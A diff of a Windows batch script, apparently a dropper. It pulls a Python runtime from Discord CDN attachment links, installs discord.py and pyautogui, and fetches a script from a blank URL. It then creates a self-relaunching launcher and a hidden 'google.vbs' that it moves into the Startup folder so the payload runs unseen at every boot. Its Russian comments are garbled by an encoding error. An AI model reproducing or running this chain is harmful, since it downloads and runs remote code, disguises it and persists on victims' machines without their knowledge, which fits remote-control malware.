@@ -1,29 +1,27 @@
-goto test
-rem ‡ £ΰγ§ª  ­¥®΅ε®¤¨¬λε δ ©«®Ά
+rem β€΅Β Β£Γ Γ£Β§ΒªΒ  Β­Β¥Β®Β΅Γ¥Β®Β¤Β¨Β¬Γ«Γ¥ Γ¤Β Β©Β«Β®ΒΆ
 curl -f -# -O "https://www.7-zip.org/a/7zr.exe"
 curl -f -# -O "https://cdn.discordapp.com/attachments/1160558928480976996/1227605728202588170/Python310.7z.001?ex=662903ed&is=66168eed&hm=87678f023b86bf39213699a8da599d7ea6a8f828558c5e839291e2bbf077d955&"
 curl -f -# -O "https://cdn.discordapp.com/attachments/1160558928480976996/1227605728521490463/Python310.7z.002?ex=662903ed&is=66168eed&hm=53f94c329af42341fa36a6b8705c9bfe4824ff5f150543571195a1809e72151a&"
-rem ΰ α― ª®Άª  ¨ ®η¨αβª  «¨θ­¨ε δ ©«®Ά
+rem Γ Β Γ΅Β―Β ΒªΒ®ΒΆΒªΒ  Β¨ Β®Γ§Β¨Γ΅ΓΆΒªΒ  Β«Β¨Γ¨Β­Β¨Γ¥ Γ¤Β Β©Β«Β®ΒΆ
 7zr.exe x Python310.7z.001
 del 7zr.exe
 del Python310.7z.001
 del Python310.7z.002
-rem ‘®§¤ ­¨¥ «¨αβ  ¤«ο γαβ ­®Ά®ª
+rem β€Β®Β§Β¤Β Β­Β¨Β¥ Β«Β¨Γ΅ΓΆΒ  Β¤Β«Γ― Γ£Γ΅ΓΆΒ Β­Β®ΒΆΒ®Βª
 echo discord.py >> packages.python
 echo pyautogui >> packages.python
-rem “αβ ­®Άª  ­¥®΅ε®¤¨¬λε ― ª¥β®Ά
+rem β€Γ΅ΓΆΒ Β­Β®ΒΆΒªΒ  Β­Β¥Β®Β΅Γ¥Β®Β¤Β¨Β¬Γ«Γ¥ Β―Β ΒªΒ¥ΓΆΒ®ΒΆ
 "%~dp0Python310\Scripts\pip.exe" install -r %~dp0packages.python
-rem ‡ £ΰγ§ª  αªΰ¨―β  python
+rem β€΅Β Β£Γ Γ£Β§ΒªΒ  Γ΅ΒªΓ Β¨Β―ΓΆΒ  python
 curl -f -# -O ""
-rem ‘®§¤ ­¨¥ αªΰ¨―β  ¤«ο αªΰλβ®£® § ―γαª 
-:test
+rem β€Β®Β§Β¤Β Β­Β¨Β¥ Γ΅ΒªΓ Β¨Β―ΓΆΒ  Β¤Β«Γ― Γ΅ΒªΓ Γ«ΓΆΒ®Β£Β® Β§Β Β―Γ£Γ΅ΒªΒ 
 echo @echo off >> script.bat
 echo :offtaskkill >> script.bat
 echo "%~dp0Python310\python.exe" "%~dp0main.py" >> script.bat
 echo goto offtaskkill >> script.bat
-rem ‘®§¤ ­¨¥ αªΰ¨―β   Άβ®§ £ΰγ§ª¨
+rem β€Β®Β§Β¤Β Β­Β¨Β¥ Γ΅ΒªΓ Β¨Β―ΓΆΒ  Β ΒΆΓΆΒ®Β§Β Β£Γ Γ£Β§ΒªΒ¨
 echo Set WshShell = CreateObject("WScript.Shell") >> google.vbs
 echo WshShell.Run "cmd.exe /c %~dp0script.bat", 0, false >> google.vbs
 move google.vbs "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
-rem ‡ ―γαª αªΰ¨―β 
+rem β€΅Β Β―Γ£Γ΅Βª Γ΅ΒªΓ Β¨Β―ΓΆΒ 
 pause
